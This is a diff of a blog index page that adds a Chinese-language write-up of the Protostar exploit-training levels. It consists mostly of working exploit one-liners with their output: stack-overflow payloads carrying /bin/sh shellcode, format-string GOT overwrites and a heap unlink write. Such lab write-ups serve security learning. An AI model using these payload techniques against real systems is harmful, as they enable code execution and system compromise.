@@ -75,6 +75,68 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2017-04-11T06:48:37.000Z"><a href="/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/">2017-04-11</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/">Exploit-Exercises Protostar writeup PART I</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x44*'a'"</span> | ./stack0</div><div class="line">you have changed the <span class="string">'modified'</span> variable</div></pre></td></tr></table></figure>
+<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x64\x63\x62\x61'"</span> | xargs ./stack1</div><div class="line">you have correctly got the variable to the right value</div></pre></td></tr></table></figure>
+<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</div><div class="line">os.system(<span class="string">"./stack2"</span>)</div></pre></td></tr></table></figure>
+<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack3 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 08048424    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x24\x84\x04\x08'"</span> | ./stack3</div><div class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
+<h2 id="stack-4"><a href="#stack-4" class="headerlink" title="stack 4"></a>stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack4 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 080483f4    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 76*'a'+'\xf4\x83\x04\x08'"</span>|./stack4</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
+<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : disabled</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
+<p>系统没开ASLR。让程序崩溃，调试core dump获得stack address。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print 0x4c*'a'+'\x10\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack5</div></pre></td></tr></table></figure></p>
+<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>return addr =&gt; addr(ret) =&gt; stack addr</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048508</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x08\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
+<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048553</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x53\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
+<h2 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 0x40*'a'+'\xef\xbe\xad\xde'" | xargs ./format0</span></div><div class="line">you have hit the target correctly :)</div></pre></td></tr></table></figure>
+<h2 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h2><p><code>%128$n</code>代表第128个参数，argv会放在栈上。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\x38\x96\x04\x08\x08\x04aaa%128\$n'" | xargs ./format1                                                                       aaayou have modified the target :)</span></div></pre></td></tr></table></figure>
+<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048477 &lt;vuln+35&gt;: call   0x804835c &lt;fgets@plt&gt;</div><div class="line">   0x804847c &lt;vuln+40&gt;: lea    eax,[ebp-0x208]</div><div class="line">   0x8048482 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048485 &lt;vuln+49&gt;: call   0x804837c &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4</div><div class="line">   0x804848f &lt;vuln+59&gt;: cmp    eax,0x40</div><div class="line">   0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;</div><div class="line">   0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd440 --&gt; 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">0004| 0xffffd444 --&gt; 0x200</div><div class="line">0008| 0xffffd448 --&gt; 0xf7<span class="built_in">fc</span>2c20 --&gt; 0xfbad2288</div><div class="line">0012| 0xffffd44c --&gt; 0xf7fec308 (&lt;_dl_check_map_versions+632&gt;:  mov    edi,eax)</div><div class="line">0016| 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div></pre></td></tr></table></figure>
+<p>exploit:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\xe4\x96\x04\x08%4\$060x%4\$n'" | ./format2</span></div><div class="line">.0000000000000000000000000000000000000000000000000000080496e4</div><div class="line">you have modified the target :)</div></pre></td></tr></table></figure>
+<h2 id="format3"><a href="#format3" class="headerlink" title="format3"></a>format3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\xf4\x96\x04\x08%12\$016930112x%12\$n'"</span> | ./format3</div></pre></td></tr></table></figure>
+<p>看了我的方法还是有点弱- -，基本就是一字节写比较好的方法</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"\xf7\x96\x04\x08"+"%52x%12$n%13$n%14$n%15$n"'</span> | ./format3</div><div class="line">target is 44444444 :(</div></pre></td></tr></table></figure>
+<h2 id="format4"><a href="#format4" class="headerlink" title="format4"></a>format4</h2><p>写exit的GOT表中的数据,<code>GOT[&quot;exit&quot;]=0x08049724</code>，单字节写入。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08'+'%0164x%4\$n%0208x%5\$n%0128x%6\$n%260x%7\$n'"</span> | ./format4</div></pre></td></tr></table></figure>
+<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>winner = 0x08048464</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 72*'a'+'\x64\x84\x04\x08'" | xargs ./heap0</span></div><div class="line">data is at 0x804a008, fp is at 0x804a050</div><div class="line">level passed</div></pre></td></tr></table></figure>
+<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>GOT[“puts”] = 0x08049774<br>winner = 0x08048494<br>没啥说的，把第二个指针覆盖为puts的got地址，第二次strcpy把winner写入puts的got表中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap1 $(python -c "print 20 * 'a' + '\x74\x97\x04\x08'")  $(python -c "print '\x94\x84\x04\x08'")</span></div><div class="line">and we have a winner @ 1491862467</div></pre></td></tr></table></figure>
+<h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><p>很明显的UAF，struct auth = 36字节，先创建auth，再free再用strdup分配36字节大小的空间即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ auth = (nil), service = (nil) ]</div><div class="line">auth aaaaa</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">reset</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div><div class="line">login</div><div class="line">you have logged <span class="keyword">in</span> already!</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div></pre></td></tr></table></figure>
+<h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><p>unlink导致任意地址写</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap3 $(python -c 'print "A" * 4 + "\x68\x64\x88\x04\x08\xc3"') $(python -c 'print "A" * 32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 8 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC</span></div><div class="line">that wasn<span class="string">'t too bad now, was it? @ 1491865342</span></div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-04-07T08:40:22.000Z"><a href="/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/">2017-04-07</a></time>
       
       
@@ -428,43 +490,6 @@
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-21T06:43:18.000Z"><a href="/2017/02/21/unlink-Writeup-pwnable-kr/">2017-02-21</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/21/unlink-Writeup-pwnable-kr/">unlink Writeup[pwnable.kr]</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="0x00-unlink"><a href="#0x00-unlink" class="headerlink" title="0x00 unlink"></a>0x00 unlink</h2><p>unlink是堆溢出的常用思路，free一个堆时。有可能会调用unlink函数来拆卸freelist上堆块完成堆块的合并。如果能控制堆的控制区就有可能造成DWSHOOT（有限的任意地址写入）。</p>
-      
-    </div>
-    <footer>
-      
-        
-          <div class="alignleft">
-            <a href="/2017/02/21/unlink-Writeup-pwnable-kr/#more" class="more-link">Read More</a>
-          </div>
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
 
 <nav id="pagination">
   
@@ -490,7 +515,7 @@
   
     <li><a href="/categories/安全/">安全</a><small>8</small></li>
   
-    <li><a href="/categories/tech/">技术</a><small>21</small></li>
+    <li><a href="/categories/tech/">技术</a><small>22</small></li>
   
     <li><a href="/categories/life/">生活</a><small>3</small></li>
   
@@ -521,7 +546,7 @@
   
     <li><a href="/tags/博客/">博客</a><small>4</small></li>
   
-    <li><a href="/tags/安全/">安全</a><small>17</small></li>
+    <li><a href="/tags/安全/">安全</a><small>18</small></li>
   
     <li><a href="/tags/影评/">影评</a><small>1</small></li>
   
@@ -529,7 +554,7 @@
   
     <li><a href="/tags/漏洞/">漏洞</a><small>1</small></li>
   
-    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>2</small></li>
+    <li><a href="/tags/漏洞分析/">漏洞分析</a><small>3</small></li>
   
     <li><a href="/tags/调试/">调试</a><small>1</small></li>
   
